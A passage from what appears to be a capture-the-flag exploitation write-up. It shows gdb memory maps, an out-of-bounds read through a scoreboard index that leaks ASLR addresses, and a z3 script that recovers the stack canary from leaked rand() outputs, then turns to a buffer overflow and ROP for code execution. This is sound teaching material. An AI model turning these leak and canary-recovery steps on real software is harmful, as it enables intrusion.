<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef‚û§  vmmap
</span></span><span style="display:flex;"><span>[ Legend:  Code | Heap | Stack ]
</span></span><span style="display:flex;"><span>Start              End                Offset             Perm Path
</span></span><span style="display:flex;"><span>0x000042f0000000 0x000042f0002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x000042f0002000 0x000042f0004000 0x00000000000000 rw- 
</span></span><span style="display:flex;"><span>0x000042f0004000 0x000042f0005000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x00006fe0000000 0x00006fe0001000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x00006fe0001000 0x00006fe0003000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x00007ab0000000 0x00007ab0002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x00007ab0002000 0x00007ab0004000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x000097e0000000 0x000097e0002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x000097e0002000 0x000097e0004000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x0000c920000000 0x0000c920002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x0000c920002000 0x0000c920003000 0x00000000000000 rw- 
</span></span><span style="display:flex;"><span>0x0000c920003000 0x0000c920005000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x0000f0b0000000 0x0000f0b0002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x0000f0b0002000 0x0000f0b0003000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x0000f900000000 0x0000f900002000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x0000f900002000 0x0000f900003000 0x00000000000000 r-- 
</span></span><span style="display:flex;"><span>0x007ffff7ff7000 0x007ffff7ff8000 0x00000000000000 r-x 
</span></span><span style="display:flex;"><span>0x007ffff7ff8000 0x007ffff7ff9000 0x00000000000000 rw- 
</span></span><span style="display:flex;"><span>0x007ffff7ff9000 0x007ffff7ffd000 0x00000000000000 r-- [vvar]
</span></span><span style="display:flex;"><span>0x007ffff7ffd000 0x007ffff7fff000 0x00000000000000 r-x [vdso]
</span></span><span style="display:flex;"><span>0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack]
</span></span><span style="display:flex;"><span>0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]
</span></span></code></pre></td></tr></table>
</div>
</div><p>Yes it is. Notice that most of the region addresses&rsquo; first 12-bits in the vmmap is our <code>rand()</code> result. Now, our goal is to recover these addresses via the OOB bug.</p>
<p>Playing around the gdb, we notice that putting <code>512</code> as the scoreboard offset will leak our <code>1st</code> rand result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Which place&#39;s score do you want to see (0-9)?
</span></span><span style="display:flex;"><span>512
</span></span><span style="display:flex;"><span>To get this place you need to beat this score: 287494381664
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>In [260]: hex(287494381664)
</span></span><span style="display:flex;"><span>Out[260]: &#39;0x42f0002060&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that the first 12-bits of the number are the <code>rand()</code> result (Specifically the first <code>rand()</code> result after <code>rand_state = canary</code>). So basically our goal is with this OOB, we will try to leak all the aslr addresses generated by the <code>rand()</code> method.</p>
<p>Also, we actually can use a negative index. But we need to convert it to unsigned first. For example, if you want to put <code>-1</code>, then send <code>2**64-1</code> as the offset value.</p>
<p>After playing throughout the gdb, we notice a consistent pattern on each run, which we will explain below:</p>
<ul>
<li>Offset 512 -&gt; Leak the 1st rand() result (<code>base_1</code> region address)</li>
<li>Offset -1017 -&gt; Leak the 3rd rand() result (<code>base_3</code> region address)</li>
<li>Offset -1019 -&gt; Leak the 5th rand() result (<code>base_5</code> region address)</li>
<li>After leaking the 5th rand(), we notice that the address region started with the 5th <code>rand()</code>&rsquo;s value contains the 4th and 6th <code>rand()</code>&rsquo;s results. So subtracting the 5th leaked address with the 1st leaked address can leak the 4th and 6th <code>rand()</code> value.</li>
<li>After leaking the 4th <code>rand()</code>, we notice that the address region started with the 4th <code>rand()</code>s value contains the 2nd <code>rand()</code> result. So subtracting the 4th leaked with the 1st leaked can leak the 2nd <code>rand()</code> value.</li>
</ul>
<p>You can see my shared script later if you&rsquo;re quite confused, but, basically, with correct OOB offsets, we managed to leak the first 6 of the aslr addresses where the first 12-bit of each address is generated by <code>rand()</code>.</p>
<h4 id="recover-canary-value">Recover <code>canary</code> value <a href="#recover-canary-value" class="anchor">#</a></h4>
<p>Now that we have leaked 6 consecutive of the <code>rand()</code> values, this is actually enough to recover our <code>canary</code> value. How to do this? Just translate the <code>rand()</code> method to python and put it in <code>z3</code> üòÇ. <code>z3</code> is an SMT solver. Given some constraints, it will try to check whether any solution that can satisfy the constraints exists or not.</p>
<p>In this case, the constraints that we will use are the leaked <code>rand()</code> values, while the solution that we try to find is a 64-bit number (which is the <code>rand_state</code>). So, what we can do is simply re-write the <code>rand()</code> algorithm that we see in the decompiled result to python, and then try to construct the constraints for our target solution (<code>rand_state</code>) by adding equality constraint, where each <code>rand()</code> call result need to be equal to our leaked value.</p>
<p>Here is the sample POC, where we will use the previous value that we get from GDB.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">z3</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Sanity check</span>
</span></span><span style="display:flex;"><span>real_canary <span style="color:#555">=</span> <span style="color:#f60">0x75924ac4cc2d256a</span>
</span></span><span style="display:flex;"><span>known_states7 <span style="color:#555">=</span> <span style="color:#f60">0xf0b</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># For POC, we will use only 6 of the rand() values, because we can only recover 6 rand() values</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># based on previous analysis</span>
</span></span><span style="display:flex;"><span>known_states <span style="color:#555">=</span> [<span style="color:#f60">0x42f</span>, <span style="color:#f60">0xf90</span>, <span style="color:#f60">0x97e</span>, <span style="color:#f60">0x7ab</span>, <span style="color:#f60">0xc92</span>, <span style="color:#f60">0x6fe</span>]
</span></span><span style="display:flex;"><span>s <span style="color:#555">=</span> Solver()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Rand state is a 64-bit value</span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_extract_bit</span>(a):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> (rand_state <span style="color:#555">&gt;&gt;</span> a) <span style="color:#555">&amp;</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand_get_bit</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">global</span> rand_state
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> (
</span></span><span style="display:flex;"><span>        rand_extract_bit(<span style="color:#f60">0x3F</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3D</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3C</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> rand_extract_bit(<span style="color:#f60">0x3A</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#555">^</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>    rand_state <span style="color:#555">=</span> ((rand_state <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">%</span> (<span style="color:#f60">2</span><span style="color:#555">**</span><span style="color:#f60">64</span>)) <span style="color:#555">|</span> x
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">rand</span>(n):
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(n):
</span></span><span style="display:flex;"><span>        y <span style="color:#555">=</span> rand_get_bit()
</span></span><span style="display:flex;"><span>        x <span style="color:#555">=</span> (x <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span>) <span style="color:#555">|</span> y
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> x
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Setting constraints, where each rand() call result</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># should be the same as the leaked rand() values</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> known_state <span style="color:#000;font-weight:bold">in</span> known_states:
</span></span><span style="display:flex;"><span>    s<span style="color:#555">.</span>add(rand(<span style="color:#f60">0xc</span>) <span style="color:#555">==</span> known_state)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Solve the equations with z3 by checking whether the solver</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># can satisfy the constraint</span>
</span></span><span style="display:flex;"><span>recovered_canary <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> s<span style="color:#555">.</span>check() <span style="color:#555">==</span> sat:
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># If yes, that mean z3 found the solution, which basically our</span>
</span></span><span style="display:flex;"><span>    <span style="color:#09f;font-style:italic"># canary value.</span>
</span></span><span style="display:flex;"><span>    model <span style="color:#555">=</span> s<span style="color:#555">.</span>model()
</span></span><span style="display:flex;"><span>    recovered_canary <span style="color:#555">=</span> model[BitVec(<span style="color:#c30">&#34;x&#34;</span>, <span style="color:#f60">64</span>)]<span style="color:#555">.</span>as_long()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Check whether the recoverd rand_state (canary) is the same as what</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># we got from GDB value.</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Known states    : </span><span style="color:#a00">{</span>known_states<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Real canary     : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(real_canary)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Recovered canary: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(recovered_canary)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Now we have recovered the canary (rand_state), let&#39;s calculate</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># the address of the 7th rand() result. Inspecting via gdb, this</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># 7th address contains a lot of useful gadgets.</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Recover 7th address</span>
</span></span><span style="display:flex;"><span>rand_state <span style="color:#555">=</span> recovered_canary
</span></span><span style="display:flex;"><span>recovered_known_state7 <span style="color:#555">=</span> <span style="color:#f60">0</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">7</span>):
</span></span><span style="display:flex;"><span>    recovered_known_state7 <span style="color:#555">=</span> rand(<span style="color:#f60">12</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Check whether thhe recovered 7th rand() value is the same as what</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># we got from GDB value.</span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Real Addr 7th   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(known_states7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Recovered Addr  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(recovered_known_state7)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Executing the above POC will be proof that z3 is able to recover the <code>canary</code> value. Also after we recovered the initial <code>rand_state</code>, we can simply get the 7th <code>rand()</code> by calling <code>rand()</code> 7 times. This will be useful later! Below is the POC result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Known states    : [1071, 3984, 2430, 1963, 3218, 1790]
</span></span><span style="display:flex;"><span>[*] Real canary     : 0x75924ac4cc2d256a
</span></span><span style="display:flex;"><span>[*] Recovered canary: 0x75924ac4cc2d256a
</span></span><span style="display:flex;"><span>[*] Real Addr 7th   : 0xf0b
</span></span><span style="display:flex;"><span>[*] Recovered Addr  : 0xf0b
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="leverage-the-bof-bug-to-perform-rce">Leverage the BOF bug to perform RCE <a href="#leverage-the-bof-bug-to-perform-rce" class="anchor">#</a></h4>
<p>Now we have POC to recover our canary value, we can use the BOF bug to perform RCE by overwriting the saved return pointer. One of the common techniques to achieve RCE via BOF is called return oriented programming (<a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">ROP</a>).</p>
